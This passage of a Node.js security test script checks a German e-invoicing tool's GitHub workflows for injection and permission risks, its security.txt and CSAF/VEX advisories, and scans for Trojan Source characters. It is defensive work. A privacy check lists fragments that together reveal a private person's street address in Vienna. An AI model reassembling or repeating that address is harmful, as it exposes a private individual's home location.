    const target = (u) => { const t2 = path.posix.normalize(path.posix.join(path.posix.dirname(f), u.split('#')[0])); return t2.endsWith('/') ? t2 + 'index.html' : t2; };
    const relBroken = relative.filter((u) => !published.has(target(u)));
    check(f + ': relative links resolve (' + relative.length + ')', relBroken.length === 0, relBroken.join(' '));
  }

  // =============================================================================================================
  section = 'workflows';
  // =============================================================================================================
  // the build and publication path (GitHub Actions): no workflow runs with write permissions on code it did not check
  // out from a push of this repository, values reach scripts only through environment variables, the publication
  // happens only after the complete verification of the same commit
  /** the run scripts of a workflow (block scalars and one-line values) */
  const runScripts = (y) => {
    const lines = y.split('\n');
    const out = [];
    for (let i = 0; i < lines.length; i++) {
      const m = /^(\s*)(?:- )?run:\s*(.*)$/.exec(lines[i]);
      if (!m) continue;
      const indent = m[1].length + (/^\s*- /.test(lines[i]) ? 2 : 0);
      if (!/^[|>][-+]?\s*$/.test(m[2])) { out.push(m[2]); continue; }
      const body = [];
      for (let j = i + 1; j < lines.length && (lines[j].trim() === '' || lines[j].search(/\S/) > indent); j++) body.push(lines[j]);
      out.push(body.join('\n'));
    }
    return out;
  };
  const workflows = fs.readdirSync(path.join(root, '.github', 'workflows')).filter((f) => /\.ya?ml$/.test(f)).sort();
  for (const f of workflows) {
    const y = read('.github/workflows/' + f);
    const on = (/^on:\n([\s\S]*?)^\S/m.exec(y) || [null, ''])[1];
    check(f + ': no trigger that gives write permissions to code of others (pull_request_target, workflow_run)', !/^\s+(pull_request_target|workflow_run):/m.test(on));
    check(f + ': top-level permissions none or read-only', /^permissions: (\{\}|read-all)/m.test(y) || /^permissions:\n  contents: read\n(?! )/m.test(y));
    check(f + ': no checkout of a ref taken from the event', !/^\s+ref: \$\{\{\s*github\.(event|head_ref)/m.test(y));
    const scripts = runScripts(y);
    const injected = scripts.filter((r) => /\$\{\{/.test(r));
    check(f + ': no expression inside a run script (' + scripts.length + ' scripts; values only through env)', injected.length === 0, injected.map((r) => r.trim().slice(0, 80)).join(' | '));
  }
  check('the publication is a job of verify.yml (no separate pages workflow started by another one)', !workflows.includes('pages.yml') && pagesJob.length > 0);
  // the test tools: only from the lock file, with the registry signatures verified
  const allScripts = workflows.flatMap((f) => runScripts(read('.github/workflows/' + f)));
  const npmInstalls = allScripts.filter((r) => /\bnpm (?:install|i|add)\b/.test(r));
  const npmCi = allScripts.filter((r) => /\bnpm ci\b/.test(r));
  check('test tools installed only with npm ci from package-lock.json (no npm install)', npmInstalls.length === 0 && npmCi.length > 0, npmInstalls.map((r) => r.trim().slice(0, 80)).join(' | '));
  check('every npm ci without install scripts and followed by npm audit signatures', npmCi.every((r) => /npm ci --ignore-scripts\b/.test(r) && /npm ci[^\n]*\n\s*npm audit signatures\b/.test(r)), npmCi.length);
  const lock = JSON.parse(read('package-lock.json'));
  const pkg = JSON.parse(read('package.json'));
  const lockPackages = Object.entries(lock.packages).filter(([k]) => k);
  check('package-lock.json: lockfile version 3, the exact versions of package.json', lock.lockfileVersion === 3 && JSON.stringify(lock.packages[''].devDependencies) === JSON.stringify(pkg.devDependencies) &&
    Object.entries(pkg.devDependencies).every(([n, v]) => lock.packages['node_modules/' + n] && lock.packages['node_modules/' + n].version === v));
  const unpinned = lockPackages.filter(([, v]) => !/^https:\/\/registry\.npmjs\.org\//.test(v.resolved || '') || !/^sha512-[A-Za-z0-9+/]{86}==$/.test(v.integrity || ''));
  check('package-lock.json: every package (' + lockPackages.length + ') from registry.npmjs.org with SHA-512 integrity', lockPackages.length > 0 && unpinned.length === 0, unpinned.map(([k]) => k).join(', '));
  check('the job pages runs only after every verification job and only for a push to main', /needs: \[verify, kosit-jar-maven, pdfa-verapdf, windows, platforms\]/.test(pagesJob) && /if: github\.event_name == 'push' && github\.ref == 'refs\/heads\/main'/.test(pagesJob));
  check('the job pages builds the page that the job verify tested (programSha256 compared)', /a\.programSha256 !== t\.programSha256/.test(pagesJob) && /download-artifact@[0-9a-f]{40}/.test(pagesJob));
  check('every published file is attested and read back after the deployment', /attest-build-provenance@[0-9a-f]{40}/.test(pagesJob) && /attest-sbom@[0-9a-f]{40}/.test(pagesJob) && /check-published\.cjs "\$\{PAGE_URL\}" --commit "\$\{GITHUB_SHA\}" --local site/.test(pagesJob));

  // =============================================================================================================
  section = 'security.txt';
  // =============================================================================================================
  const txt = fs.readFileSync(path.join(siteDir, '.well-known', 'security.txt'), 'utf8');
  const lines = txt.split('\n');
  check('UTF-8, LF line endings, ends with a line break', !txt.includes('\r') && txt.endsWith('\n') && Buffer.from(txt, 'utf8').toString('utf8') === txt);
  const fields = [];
  const KNOWN = ['Acknowledgments', 'Canonical', 'Contact', 'Encryption', 'Expires', 'Hiring', 'Policy', 'Preferred-Languages', 'CSAF'];
  for (const l of lines.filter((x) => x && !x.startsWith('#'))) {
    const m = /^([A-Za-z-]+): (\S.*)$/.exec(l);
    check('field syntax: ' + l.slice(0, 60), !!m);
    if (m) fields.push([m[1], m[2]]);
  }
  const vals = (n) => fields.filter(([k]) => k === n).map(([, v]) => v);
  check('only registered fields (RFC 9116 section 6.4) and CSAF (CSAF 2.0 requirement 8)', fields.every(([k]) => KNOWN.includes(k)), fields.map(([k]) => k).filter((k) => !KNOWN.includes(k)).join(' '));
  check('Contact: present, mailto: or https:, the e-mail of legal/security.json first', vals('Contact').length >= 1 && vals('Contact').every((v) => /^(mailto:[^@\s]+@[^@\s]+|https:\/\/\S+)$/.test(v)) && vals('Contact')[0] === 'mailto:' + sec.contactEmail);
  check('Contact: the report form for confidential reports', vals('Contact').includes(sec.reportForm));
  check('Expires: exactly once, RFC 3339 in UTC', vals('Expires').length === 1 && /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}Z$/.test(vals('Expires')[0]));
  const exp = Date.parse(vals('Expires')[0]), now = Date.now();
  check('Expires: more than 30 days ahead (renew legal/security.json securityTxtExpires before)', exp - now > 30 * 864e5, vals('Expires')[0]);
  check('Expires: at most a year ahead (RFC 9116 2.5.5)', exp - now <= 366 * 864e5, vals('Expires')[0]);
  check('Canonical: https, includes the URL of this file on the project site', vals('Canonical').every((v) => /^https:\/\//.test(v)) && vals('Canonical').includes(sec.site + '.well-known/security.txt'));
  check('Policy: the CVD policy page; Acknowledgments page; CSAF provider metadata', vals('Policy')[0] === sec.site + 'cvd-policy/' && vals('Acknowledgments')[0] === sec.site + 'security-acknowledgements/' && vals('CSAF')[0] === sec.site + '.well-known/csaf/provider-metadata.json');
  check('Preferred-Languages: at most once, language tags', vals('Preferred-Languages').length === 1 && /^[a-z]{2,3}(-[A-Za-z0-9]+)*(, [a-z]{2,3}(-[A-Za-z0-9]+)*)*$/.test(vals('Preferred-Languages')[0]));
  for (const f of ['Policy', 'Acknowledgments', 'CSAF']) for (const v of vals(f)) check(f + ' target is published: ' + v.slice(sec.site.length), resolves(v));

  // =============================================================================================================
  section = 'csaf';
  // =============================================================================================================
  const csafRoot = path.join(siteDir, '.well-known', 'csaf');
  const metaFile = path.join(csafRoot, 'provider-metadata.json');
  const meta = JSON.parse(fs.readFileSync(metaFile, 'utf8'));
  const whiteDir = path.join(csafRoot, 'white');
  const docsList = [];
  for (const y of fs.readdirSync(whiteDir).filter((d) => /^\d{4}$/.test(d))) for (const f of fs.readdirSync(path.join(whiteDir, y)).filter((x) => x.endsWith('.json'))) docsList.push({ year: y, file: f, path: path.join(whiteDir, y, f), text: fs.readFileSync(path.join(whiteDir, y, f), 'utf8') });
  check('CSAF documents: ' + docsList.length + ' (security advisories and the VEX document)', docsList.length >= 2);
  if (!csafDir || !fs.existsSync(path.join(csafDir, 'csaf_2.0', 'json_schema', 'csaf_json_schema.json'))) check('CSAF checkout given', false, String(csafDir));
  else {
    const broken = JSON.parse(docsList[0].text);
    delete broken.document.tracking.id;
    broken.document.category = '';
    // in a directory of its own (fs.mkdtempSync: unique name, permissions of the user only)
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'csaf-broken-'));
    const tmp = path.join(tmpDir, 'csaf-broken.json');
    fs.writeFileSync(tmp, JSON.stringify(broken));
    const py = process.platform === 'win32' ? 'python' : 'python3';
    const r = spawnSync(py, ['-I', path.join(__dirname, 'sbom-oracle', 'validate_csaf.py'), csafDir].concat(docsList.map((d) => d.path), [metaFile, tmp]), { encoding: 'utf8' });
    fs.rmSync(tmpDir, { recursive: true, force: true });
    const out = (r.stdout || '') + (r.stderr || '');
    console.log(out.trim().split('\n').slice(0, 6).map((l) => '  ' + l).join('\n'));
    for (const d of docsList) check('official CSAF 2.0 schema: ' + d.year + '/' + d.file + ' valid', out.includes(d.path + ': valid'), out.slice(0, 400));
    check('official provider schema: provider-metadata.json valid', out.includes(metaFile + ': valid'), out.slice(0, 400));
    check('negative control: a document without tracking id and category is rejected', out.includes(tmp + ': INVALID'), out.slice(-300));
  }
  // independent CVSS 3.1 base score (FIRST CVSS v3.1 specification, section 7 and appendix A)
  function cvss31(vector) {
    const m = {}; for (const p of vector.split('/').slice(1)) { const [k, v] = p.split(':'); m[k] = v; }
    const W = { AV: { N: 0.85, A: 0.62, L: 0.55, P: 0.2 }, AC: { L: 0.77, H: 0.44 }, UI: { N: 0.85, R: 0.62 }, CIA: { H: 0.56, L: 0.22, N: 0 } };
    const changed = m.S === 'C';
    const PR = { N: 0.85, L: changed ? 0.68 : 0.62, H: changed ? 0.5 : 0.27 }[m.PR];
    const iss = 1 - (1 - W.CIA[m.C]) * (1 - W.CIA[m.I]) * (1 - W.CIA[m.A]);
    const impact = changed ? 7.52 * (iss - 0.029) - 3.25 * Math.pow(iss - 0.02, 15) : 6.42 * iss;
    const expl = 8.22 * W.AV[m.AV] * W.AC[m.AC] * PR * W.UI[m.UI];
    const roundup = (x) => { const i = Math.round(x * 100000); return i % 10000 === 0 ? i / 100000 : (Math.floor(i / 10000) + 1) / 10; };
    const score = impact <= 0 ? 0 : roundup(Math.min(changed ? 1.08 * (impact + expl) : impact + expl, 10));
    const severity = score === 0 ? 'NONE' : score < 4 ? 'LOW' : score < 7 ? 'MEDIUM' : score < 9 ? 'HIGH' : 'CRITICAL';
    const names = { AV: ['attackVector', { N: 'NETWORK', A: 'ADJACENT_NETWORK', L: 'LOCAL', P: 'PHYSICAL' }], AC: ['attackComplexity', { L: 'LOW', H: 'HIGH' }], PR: ['privilegesRequired', { N: 'NONE', L: 'LOW', H: 'HIGH' }], UI: ['userInteraction', { N: 'NONE', R: 'REQUIRED' }], S: ['scope', { U: 'UNCHANGED', C: 'CHANGED' }], C: ['confidentialityImpact', { N: 'NONE', L: 'LOW', H: 'HIGH' }], I: ['integrityImpact', { N: 'NONE', L: 'LOW', H: 'HIGH' }], A: ['availabilityImpact', { N: 'NONE', L: 'LOW', H: 'HIGH' }] };
    const props = {}; for (const [k, [n, map]] of Object.entries(names)) props[n] = map[m[k]];
    return { score, severity, props };
  }
  check('CVSS 3.1 calculator: reference vectors (FIRST examples)', cvss31('CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H').score === 9.8 && cvss31('CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N').score === 6.1 && cvss31('CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N').score === 5.5 && cvss31('CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N').score === 3.1);
  const CWE = { 'CWE-20': 'Improper Input Validation', 'CWE-91': 'XML Injection (aka Blind XPath Injection)', 'CWE-112': 'Missing XML Validation', 'CWE-400': 'Uncontrolled Resource Consumption', 'CWE-1236': 'Improper Neutralization of Formula Elements in a CSV File' };
  const fileNameOf = (id) => id.toLowerCase().replace(/[^+\-a-z0-9]+/g, '_') + '.json';
  const sortedKeys = (v) => (Array.isArray(v) ? v.every(sortedKeys) : v && typeof v === 'object' ? Object.keys(v).every((k, i, a) => i === 0 || a[i - 1] < k) && Object.values(v).every(sortedKeys) : true);
  const info = JSON.parse(read('dist/BUILD_INFO.json'));
  const cdxVex = JSON.parse(read('dist/vex.cdx.json'));
  const STATUS_GROUPS = { affected: ['first_affected', 'known_affected', 'last_affected'], not_affected: ['known_not_affected'], fixed: ['first_fixed', 'fixed'], under_investigation: ['under_investigation'] };
  for (const d of docsList) {
    const doc = JSON.parse(d.text);
    const t = doc.document.tracking;
    const label = d.file + ' – ';
    // definitions and references of product ids
    const defined = [];
    (function walk(bs) { for (const b of bs || []) { if (b.product) defined.push(b.product.product_id); walk(b.branches); } })(doc.product_tree.branches);
    for (const fp of doc.product_tree.full_product_names || []) defined.push(fp.product_id);
    for (const rel of doc.product_tree.relationships || []) defined.push(rel.full_product_name.product_id);
    const referenced = [];
    for (const v of doc.vulnerabilities || []) {
      for (const ids of Object.values(v.product_status || {})) referenced.push(...ids);
      for (const s of v.scores || []) referenced.push(...s.products);
      for (const x of (v.remediations || []).concat(v.threats || [], v.flags || [])) referenced.push(...(x.product_ids || []));
    }
    check(label + '6.1.1 every referenced product id is defined', referenced.every((p) => defined.includes(p)), referenced.filter((p) => !defined.includes(p)).join(' '));
    check(label + '6.1.2 no product id defined twice', new Set(defined).size === defined.length);
    check(label + '6.2.1 every defined product id is used', defined.every((p) => referenced.includes(p)), defined.filter((p) => !referenced.includes(p)).join(' '));
    for (const v of doc.vulnerabilities || []) {
      const vl = label + (v.cve || v.title) + ': ';
      const groupOf = {};
      let contradiction = false;
      for (const [g, keys] of Object.entries(STATUS_GROUPS)) for (const k2 of keys) for (const p of (v.product_status || {})[k2] || []) { if (groupOf[p] && groupOf[p] !== g) contradiction = true; groupOf[p] = g; }
      check(vl + '6.1.6 no contradicting product status', !contradiction);
      const scored = {};
      for (const s of v.scores || []) {
        for (const p of s.products) { const key = p + ' ' + (s.cvss_v3 ? s.cvss_v3.version : 'v2'); check(vl + '6.1.7 one score per version and product (' + p + ')', !scored[key]); scored[key] = true; }
        if (s.cvss_v3) {
          const c = cvss31(s.cvss_v3.vectorString);
          check(vl + '6.1.9 CVSS ' + s.cvss_v3.vectorString + ': base score ' + s.cvss_v3.baseScore + ' ' + s.cvss_v3.baseSeverity + ' computed', c.score === s.cvss_v3.baseScore && c.severity === s.cvss_v3.baseSeverity, c.score + ' ' + c.severity);
          check(vl + '6.1.10 CVSS properties consistent with the vector', Object.entries(c.props).every(([k2, val]) => s.cvss_v3[k2] === undefined || s.cvss_v3[k2] === val) && s.cvss_v3.vectorString.startsWith('CVSS:' + s.cvss_v3.version + '/'));
        }
      }
      if (v.cwe) check(vl + '6.1.11 CWE id and name as in the CWE list', CWE[v.cwe.id] === v.cwe.name, v.cwe.id + ' ' + v.cwe.name);
      check(vl + '6.1.29 every remediation names products', (v.remediations || []).every((x) => (x.product_ids || []).length || (x.group_ids || []).length));
      check(vl + '6.1.32 every flag names products', (v.flags || []).every((x) => (x.product_ids || []).length || (x.group_ids || []).length));
      const flagged = (v.flags || []).flatMap((x) => x.product_ids || []);
      check(vl + '6.1.33 at most one VEX flag per product', new Set(flagged).size === flagged.length);
      const affected = STATUS_GROUPS.affected.flatMap((k2) => (v.product_status || {})[k2] || []);
      check(vl + '6.2.2 every affected product has a remediation', affected.every((p) => (v.remediations || []).some((x) => (x.product_ids || []).includes(p))));
      check(vl + '6.2.3 every affected product has a score', affected.every((p) => (v.scores || []).some((s) => s.products.includes(p))));
      const fixed = STATUS_GROUPS.fixed.flatMap((k2) => (v.product_status || {})[k2] || []);
      check(vl + '6.2.19 no score for fixed products', !(v.scores || []).some((s) => s.products.some((p) => fixed.includes(p))));
      check(vl + '6.2.17 no CVE in ids', !(v.ids || []).some((x) => /^CVE-\d{4}-\d+$/.test(x.text)));
    }
    const cves = (doc.vulnerabilities || []).map((v) => v.cve).filter(Boolean);
    check(label + '6.1.23 no CVE used twice', new Set(cves).size === cves.length);
    check(label + '6.1.12 / 6.2.12 language tag present and valid', /^[a-z]{2}(-[A-Z]{2})?$/.test(doc.document.lang || ''));
    const purls = []; (function walk(bs) { for (const b of bs || []) { if (b.product && b.product.product_identification_helper && b.product.product_identification_helper.purl) purls.push(b.product.product_identification_helper.purl); walk(b.branches); } })(doc.product_tree.branches);
    check(label + '6.1.13 purls valid (pkg:type/namespace/name@version)', purls.every((p) => /^pkg:[a-z][a-z0-9.+-]*\/[^/@]+\/[^/@]+@[^/@?#]+$/.test(p)), purls.join(' '));
    const revs = t.revision_history;
    check(label + '6.1.14 revision history sorted by date and number', revs.every((r2, i) => i === 0 || (revs[i - 1].date <= r2.date && Number(revs[i - 1].number) < Number(r2.number))));
    check(label + '6.1.16 version = number of the latest revision', t.version === revs[revs.length - 1].number);
    check(label + '6.1.17 / 6.1.18 / 6.1.20 final document: integer version >= 1, no revision 0', t.status === 'final' && /^[1-9]\d*$/.test(t.version) && revs.every((r2) => /^[1-9]\d*$/.test(r2.number)));
    check(label + '6.1.21 / 6.1.22 revision numbers 1 … n without gaps or duplicates', revs.every((r2, i) => Number(r2.number) === i + 1));
    check(label + '6.2.5 / 6.2.6 initial and current release date match the revision history', t.initial_release_date === revs[0].date && t.current_release_date === revs[revs.length - 1].date);
    const hashAlgs = []; (function walk(bs) { for (const b of bs || []) { for (const h of ((b.product || {}).product_identification_helper || {}).hashes || []) hashAlgs.push(h.file_hashes.map((x) => x.algorithm)); walk(b.branches); } })(doc.product_tree.branches);
    check(label + '6.1.25 no hash algorithm twice for a file', hashAlgs.every((a) => new Set(a).size === a.length));
    const versionNames = []; (function walk(bs) { for (const b of bs || []) { if (b.category === 'product_version') versionNames.push(b.name); walk(b.branches); } })(doc.product_tree.branches);
    check(label + '6.1.31 no version range in product_version names', versionNames.every((n) => !/<|>|\b(after|all|before|earlier|later|prior|versions)\b/i.test(n)), versionNames.join(' '));
    check(label + '6.3.11 product_version names without "v"', versionNames.every((n) => !/^v/i.test(n)));
    const helpers = []; (function walk(bs) { for (const b of bs || []) { if (b.product) helpers.push(!!b.product.product_identification_helper); walk(b.branches); } })(doc.product_tree.branches);
    check(label + '6.2.16 every product has an identification helper', helpers.every(Boolean));
    check(label + '6.2.10 TLP label WHITE (public)', doc.document.distribution && doc.document.distribution.tlp && doc.document.distribution.tlp.label === 'WHITE');
    const self = (doc.document.references || []).filter((x) => x.category === 'self');
    check(label + '6.2.11 canonical URL (self reference) = published location', self.length === 1 && self[0].url === meta.distributions[0].directory_url + d.year + '/' + d.file);
    check(label + '6.2.13 keys sorted', sortedKeys(doc));
    check(label + 'file name (CSAF 5.1) = tracking id', fileNameOf(t.id) === d.file);
    check(label + 'year folder = year of the initial release date (requirement 11)', t.initial_release_date.slice(0, 4) === d.year);
    check(label + 'publisher = provider (a CSAF publisher distributes only its own documents)', JSON.stringify(doc.document.publisher) === JSON.stringify(meta.publisher));
    for (const alg of ['sha256', 'sha512']) {
      const hf = path.join(whiteDir, d.year, d.file + '.' + alg);
      check(label + alg + ' file (requirement 18)', fs.existsSync(hf) && fs.readFileSync(hf, 'utf8') === sha(Buffer.from(d.text, 'utf8'), alg) + '  ' + d.file + '\n');
    }
    if (doc.document.category === 'csaf_security_advisory') {
      check(label + '6.1.27.4-6 security advisory: product tree, notes and product status of every vulnerability', !!doc.product_tree && doc.vulnerabilities.every((v) => (v.notes || []).length && v.product_status));
      const names = {}; (function walk(bs) { for (const b of bs || []) { if (b.product) names[b.product.product_id] = b.product; walk(b.branches); } })(doc.product_tree.branches);
      for (const v of doc.vulnerabilities) {
        const fixedNames = (v.product_status.fixed || []).map((p) => names[p].name.replace(/^E-Rechnung Prüfer /, ''));
        const cmp = (a, b) => { const x = a.split('.').map(Number), y = b.split('.').map(Number); for (let i = 0; i < 3; i++) if (x[i] !== y[i]) return x[i] - y[i]; return 0; };
        check(label + 'fixed in a version up to the current one (' + fixedNames.join(', ') + ' <= ' + info.version + ')', fixedNames.length && fixedNames.every((n) => cmp(n, info.version) <= 0));
        const affectedHashes = (v.product_status.known_affected || []).flatMap((p) => ((names[p].product_identification_helper || {}).hashes || []).flatMap((h) => h.file_hashes.map((x) => x.value)));
        check(label + 'the current page is not among the affected pages (' + affectedHashes.length + ' hashes)', affectedHashes.length > 0 && !affectedHashes.includes(info.sha256));
      }
    }
    if (doc.document.category === 'csaf_vex') {
      check(label + '6.1.27.7-11 VEX: vulnerabilities, status, CVE or ids', doc.vulnerabilities.length > 0 && doc.vulnerabilities.every((v) => (v.cve || (v.ids || []).length) && ['fixed', 'known_affected', 'known_not_affected', 'under_investigation'].some((k2) => (v.product_status[k2] || []).length)));
      check(label + '6.1.27.9 every not-affected product has an impact statement (flag or threat)', doc.vulnerabilities.every((v) => (v.product_status.known_not_affected || []).every((p) => (v.flags || []).some((x) => x.product_ids.includes(p)) || (v.threats || []).some((x) => x.category === 'impact' && x.product_ids.includes(p)))));
      check(label + '6.1.27.10 every affected product has an action statement', doc.vulnerabilities.every((v) => (v.product_status.known_affected || []).every((p) => (v.remediations || []).some((x) => x.product_ids.includes(p)))));
      check(label + 'the VEX of the current version (' + info.version + ')', doc.document.tracking.id === 'E-RECHNUNG-PRUEFER-VEX-' + info.version);
      const csafStates = Object.fromEntries(doc.vulnerabilities.map((v) => [v.cve, Object.keys(v.product_status)[0]]));
      const cdxStates = Object.fromEntries(cdxVex.vulnerabilities.map((v) => [v.id, v.analysis.state]));
      const map = { not_affected: 'known_not_affected', exploitable: 'known_affected', in_triage: 'under_investigation', resolved: 'fixed' };
      check(label + 'same vulnerabilities and states as the CycloneDX VEX (' + Object.keys(cdxStates).length + ')', Object.keys(cdxStates).length === Object.keys(csafStates).length && Object.entries(cdxStates).every(([id, st]) => csafStates[id] === map[st]), JSON.stringify(csafStates));
    }
  }
  // the distribution
  const index = fs.readFileSync(path.join(whiteDir, 'index.txt'), 'utf8');
  check('index.txt lists every document (requirement 12)', JSON.stringify(index.trim().split('\n').sort()) === JSON.stringify(docsList.map((d) => d.year + '/' + d.file).sort()));
  const changes = fs.readFileSync(path.join(whiteDir, 'changes.csv'), 'utf8').trim().split('\n').map((l) => /^"([^"]+)","([^"]+)"$/.exec(l));
  check('changes.csv: one line per document, "path","current_release_date" (requirement 13)', changes.length === docsList.length && changes.every((m) => m && docsList.some((d) => d.year + '/' + d.file === m[1] && JSON.parse(d.text).document.tracking.current_release_date === m[2])));
  check('changes.csv: latest first', changes.every((m, i) => i === 0 || changes[i - 1][2] >= m[2]));
  check('directory listings (requirement 14): white/ and every year folder', fs.existsSync(path.join(whiteDir, 'index.html')) && docsList.every((d) => fs.readFileSync(path.join(whiteDir, d.year, 'index.html'), 'utf8').includes('href="' + d.file + '"')));
  check('provider metadata: canonical URL, directory URL, metadata version 2.0, role csaf_publisher', meta.canonical_url === sec.site + '.well-known/csaf/provider-metadata.json' && meta.distributions.length === 1 && meta.distributions[0].directory_url === sec.site + '.well-known/csaf/white/' && meta.metadata_version === '2.0' && meta.role === 'csaf_publisher');
  check('provider metadata: last_updated = latest current_release_date', meta.last_updated === docsList.map((d) => JSON.parse(d.text).document.tracking.current_release_date).sort().pop());
  check('provider metadata: keys sorted', sortedKeys(meta));

  // =============================================================================================================
  section = 'consistency';
  // =============================================================================================================
  const imp = JSON.parse(read('legal/impressum.json'));
  check('impressum and security contact: the same e-mail address', imp.email === sec.contactEmail && /^[^@\s]+@[^@\s]+\.[a-z]{2,}$/.test(sec.contactEmail));
  check('impressum: place of residence only (no street address published, § 25 Abs. 5 MedienG)', /^Wien, Österreich$/.test(imp.address) && /^Wien, Österreich$/.test(sec.residence));
  const MONTHS = ['Januar', 'Februar', 'März', 'April', 'Mai', 'Juni', 'Juli', 'August', 'September', 'Oktober', 'November', 'Dezember'];
  const [ey, em] = sec.supportEnd.split('-').map(Number);
  const endText = MONTHS[em - 1] + ' ' + ey;
  for (const f of ['SECURITY.md', 'docs/BENUTZERINFORMATION.md']) check(f + ': end of support ' + endText + ' (legal/security.json)', read(f).includes(endText));
  for (const f of ['SECURITY.md', 'docs/SCHWACHSTELLE-MELDEN.md', 'docs/BENUTZERINFORMATION.md']) check(f + ': e-mail and report form of legal/security.json', read(f).includes(sec.contactEmail) && read(f).includes(sec.reportForm));
  // TR-03183-3 4.4.1 a, c: the date of the last change is visible, the policy is reviewed at least yearly
  const [py, pm, pdd] = sec.policyDate.split('-');
  check('CVD policy: "Stand" = policyDate of legal/security.json (' + sec.policyDate + ')', read('SECURITY.md').includes('**Stand: ' + pdd + '.' + pm + '.' + py + '**'));
  check('CVD policy reviewed within the last year (policyDate ' + sec.policyDate + '; review at least yearly)', Date.now() - Date.parse(sec.policyDate + 'T00:00:00Z') < 366 * 864e5);
  const secBlock = /<script type="application\/json" id="pruefer-security">([\s\S]*?)<\/script>/.exec(html);
  const pageSec = secBlock ? JSON.parse(secBlock[1]) : {};
  check('the page: support end, contact and report form of legal/security.json', pageSec.supportEnd === sec.supportEnd && pageSec.contactEmail === sec.contactEmail && pageSec.reportForm === sec.reportForm, JSON.stringify(pageSec).slice(0, 200));
  check('the page: section "Sicherheit" rendered from docs/BENUTZERINFORMATION.md (support end shown)', html.includes(endText) && /id="sicherheit"/.test(html));
  // privacy: the private address and the account e-mail must not be published anywhere (assembled from parts, so that
  // this file does not contain them)
  const FORBIDDEN = [['W', 'ä', 'hringer'], ['W', 'ae', 'hringer'], ['136', '/5'], ['1180', ' Wien'], ['privaterelay', '.appleid', '.com']].map((p) => p.join(''));
  const git = spawnSync('git', ['-C', root, 'ls-files', '-z', '--cached', '--others', '--exclude-standard'], { encoding: 'utf8' });
  const repoFiles = (git.stdout || '').split('\0').filter((f) => f && !f.startsWith('node_modules/') && fs.existsSync(path.join(root, f)) && fs.statSync(path.join(root, f)).isFile());
  const distFiles = []; (function walk(d) { for (const e of fs.readdirSync(d, { withFileTypes: true })) { const p = path.join(d, e.name); if (e.isDirectory()) walk(p); else distFiles.push(path.relative(root, p)); } })(path.join(root, 'dist'));
  const leaks = [];
  for (const f of new Set(repoFiles.concat(distFiles))) {
    const b = fs.readFileSync(path.join(root, f));
    if (b.length > 64 * 1048576) continue;
    const s = b.toString('utf8');
    for (const w of FORBIDDEN) if (s.toLowerCase().includes(w.toLowerCase())) leaks.push(f + ': ' + w.slice(0, 3) + '…');
  }
  check('privacy: no private address and no account e-mail in ' + new Set(repoFiles.concat(distFiles)).size + ' files of the repository and dist/', leaks.length === 0, leaks.slice(0, 5).join(', '));
  // "Trojan Source" (CVE-2021-42574): no invisible formatting or bidirectional control characters in code and texts
  // (they are written as escapes \uXXXX where a test or a rule needs them); a byte order mark only at the start
  const textFiles = repoFiles.filter((f) => /^(src|tools|test|\.github|docs|legal|security)\//.test(f) || /^[^/]+\.(md|json|cjs|js)$/.test(f)).filter((f) => /\.(c?js|mjs|sh|py|md|ya?ml|css|html|json|txt|java|xml)$/.test(f) && !/^test\/(xpath-conformance|xsd-selftest|kosit-reference|encoding-oracle|line-oracle)\//.test(f));
  const hidden = [];
  for (const f of textFiles) {
    const s2 = fs.readFileSync(path.join(root, f), 'utf8').replace(/^\uFEFF/, '');
    const m = /[\p{Cf}\p{Zl}\p{Zp}\u115F\u1160\u3164\uFFA0]|[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/u.exec(s2);
    if (m) hidden.push(f + ' (U+' + m[0].codePointAt(0).toString(16).toUpperCase().padStart(4, '0') + ' at line ' + (s2.slice(0, m.index).split('\n').length) + ')');
  }
  check('no invisible or bidirectional control characters in ' + textFiles.length + ' code and text files (Trojan Source)', hidden.length === 0, hidden.slice(0, 5).join(', '));

  for (const f of failures) console.log('FAIL ' + f);
  console.log('security tests: ' + (pass + fail) + ' checks, ' + pass + ' passed, ' + fail + ' failed (' + Object.entries(counts).map(([k2, n]) => k2 + ' ' + n).join(', ') + ')');
  process.exit(fail ? 1 : 0);
})().catch((e) => { console.error(e && e.stack || e); process.exit(2); });
